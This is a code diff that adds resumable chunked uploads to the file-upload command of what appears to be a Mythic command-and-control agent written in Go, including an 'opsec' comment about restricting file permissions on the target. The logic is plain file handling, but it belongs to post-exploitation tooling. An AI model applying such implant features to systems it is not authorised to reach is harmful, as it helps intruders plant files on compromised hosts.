@@ -59,6 +59,17 @@ func (c *UploadCommand) Execute(task structs.Task) structs.CommandResult {
 		defer os.Remove(writePath) // Clean up temp file
 	}
 
+	// Check for an existing partial upload that can be resumed
+	startChunk := 1
+	resuming := false
+	if !args.Decompress { // Resume only supported for direct writes (not decompress mode)
+		existingState := files.GetTransferState(fullPath, files.TransferUpload)
+		if existingState != nil && existingState.FileID == args.FileID {
+			resuming = true
+			startChunk = existingState.LastChunk + 1
+		}
+	}
+
 	// Set up the file transfer request
 	tfResult := &structs.FileTransferResult{}
 	r := structs.GetFileFromMythicStruct{}
@@ -67,26 +78,41 @@ func (c *UploadCommand) Execute(task structs.Task) structs.CommandResult {
 	r.Task = &task
 	r.SendUserStatusUpdates = true
 	r.TransferResult = tfResult
-	totalBytesWritten := 0
+	r.StartChunk = startChunk
 
 	// Check if file exists
 	_, err = os.Stat(fullPath)
 	fileExists := err == nil
 
-	if fileExists && !args.Overwrite {
+	if fileExists && !args.Overwrite && !resuming {
 		return errorf("File %s already exists. Reupload with the overwrite parameter, or remove the file before uploading again.", fullPath)
 	}
 
-	// Open file for writing — truncate if overwriting, create if new
-	// Use 0700 permissions: owner rwx only (opsec — prevent other users from reading/executing)
-	fp, err := os.OpenFile(writePath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0700)
-	if err != nil {
-		return errorf("Failed to open %s for writing: %v", writePath, err)
+	// Open file for writing:
+	// - Resume: append mode (no truncate), seek to current file size
+	// - Normal: truncate to start fresh
+	var fp *os.File
+	if resuming {
+		fp, err = os.OpenFile(writePath, os.O_RDWR|os.O_CREATE, 0700)
+		if err != nil {
+			return errorf("Failed to open %s for resume: %v", writePath, err)
+		}
+		// Seek to end of existing partial content
+		if _, seekErr := fp.Seek(0, 2); seekErr != nil {
+			fp.Close()
+			return errorf("Failed to seek to end of %s: %v", writePath, seekErr)
+		}
+	} else {
+		fp, err = os.OpenFile(writePath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0700)
+		if err != nil {
+			return errorf("Failed to open %s for writing: %v", writePath, err)
+		}
 	}
 	defer fp.Close() // Safety net: ensure fd is closed even if transfer goroutine panics
 	r.ReceivedChunkChannel = make(chan []byte)
 	task.Job.GetFileFromMythic <- r
 
+	totalBytesWritten := 0
 	var writeErr error
 	for {
 		newBytes := <-r.ReceivedChunkChannel
@@ -127,9 +153,15 @@ func (c *UploadCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	// Build output with hash info
-	output := fmt.Sprintf("Uploaded %d bytes to %s", totalBytesWritten, fullPath)
+	var output string
+	if resuming {
+		output = fmt.Sprintf("Resumed upload: wrote %d new bytes to %s (started at chunk %d)",
+			totalBytesWritten, fullPath, startChunk)
+	} else {
+		output = fmt.Sprintf("Uploaded %d bytes to %s", totalBytesWritten, fullPath)
+	}
 	if tfResult.SHA256 != "" {
-		output += fmt.Sprintf("\nSHA256: %s", tfResult.SHA256)
+		output += fmt.Sprintf("\nSHA256 (transferred portion): %s", tfResult.SHA256)
 	}
 	return successResult(output)
 }
